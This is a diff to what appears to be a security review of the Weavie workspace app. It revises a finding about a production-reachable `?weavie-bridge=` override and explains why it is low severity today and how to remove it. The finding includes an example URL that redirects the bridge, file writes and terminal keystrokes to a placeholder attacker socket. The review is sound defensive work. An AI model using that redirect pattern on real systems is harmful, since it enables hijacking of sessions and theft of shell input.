@@ -88,21 +88,30 @@ page hold the token in memory instead of the address bar.
 
 ### 4. `?weavie-bridge=` is a production-reachable bridge override
 
-**Severity: medium.**
+**Severity: low today — but it is an escalation primitive worth removing before the token moves to a cookie.**
 
 `resolveBridgeEndpoint()` in `src/web/src/bridge.ts` lets a `?weavie-bridge=` query parameter override the
 bridge URL, and it *wins* over the host-injected `window.__WEAVIE_BRIDGE_WS__`. It is documented in
 `headless-host.md` as "handy for manual testing" but carries no `import.meta.env.DEV` guard, so it ships in
-release builds. A page loaded as `…/index.html?token=T&weavie-bridge=wss://attacker/` authenticates to the
-real worker for assets while routing the entire bridge — `fs-write` payloads, `term-input` keystrokes, every
-push — to an attacker-controlled socket.
+release builds. A page loaded as `…/index.html?token=T&weavie-bridge=wss://attacker/` routes the entire
+bridge — `fs-write` payloads, `term-input` keystrokes, every push — to an attacker-controlled socket.
 
-This is also the exact pattern AGENTS.md prohibits under "no buried debug flags": an instrumentation toggle
-that is neither a real setting nor off by default.
+**Why it is not exploitable today.** Reaching that code requires loading the workspace document, and there is
+no unauthenticated path to it: `__WEAVIE_BRIDGE_WS__` is injected only by the token-gated `ServeIndexAsync`,
+and every native host navigates to the token-gated `WorkspacePageUrl`. An attacker who can load the document
+already holds the worker token, which already grants total control of the box (`term-input` is arbitrary
+shell). The override escalates nothing.
 
-**Suggested fix:** gate the override behind `import.meta.env.DEV` so it cannot exist in a shipped bundle.
-Manual testing against an arbitrary backend is a dev-time need, and the "Add remote agent…" flow already
-covers the legitimate production case.
+**Why it is still worth removing.** Two reasons, neither urgent. It is the pattern AGENTS.md prohibits under
+"no buried debug flags" — an instrumentation toggle that is neither a real setting nor off by default. And it
+is a latent escalation primitive: the deferred hardening step of moving the document token from the URL to a
+cookie makes page URLs shareable, at which point a crafted link turns this into real session MITM. Removing
+it *before* that lands is the cheap ordering.
+
+**Suggested fix — note it is not a flag flip.** Gating the override behind `import.meta.env.DEV` breaks the
+e2e suite, which drives every page load through this parameter (`mock-host.ts` builds its page URLs as
+`?weavie-bridge=<mock>`). The harness must first inject `__WEAVIE_BRIDGE_WS__` in its stand-in bootstrap
+instead — which is where it already builds one. Treat this as a test-harness change, not a one-line guard.
 
 ### 5. No `Origin` check on the bridge WebSocket, and a test that claims otherwise
 
